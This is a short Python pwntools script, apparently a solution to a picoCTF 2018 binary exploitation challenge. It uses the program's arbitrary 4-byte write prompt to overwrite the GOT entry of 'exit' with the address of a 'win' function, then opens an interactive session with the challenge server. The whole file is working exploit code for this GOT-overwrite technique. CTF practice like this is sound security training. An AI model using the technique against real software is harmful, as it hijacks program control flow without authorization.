from pwn import *

PROGRAM = "./auth"

e = ELF(PROGRAM)

r = remote("2018shell3.picoctf.com", 23731)
log.info("Address of 'exit' .got.plt entry: {}".format(hex(e.got['exit'])))
log.info("Address of 'win': {}".format(hex(e.symbols['win'])))
r.sendlineafter("Where would you like to write this 4 byte value?", hex(e.got['exit']))
#r.sendline("Where would you like to write this 4 byte value?", hex(e.got['exit']))

print r.recvline()
r.sendline(hex(e.symbols['win']))

r.interactive()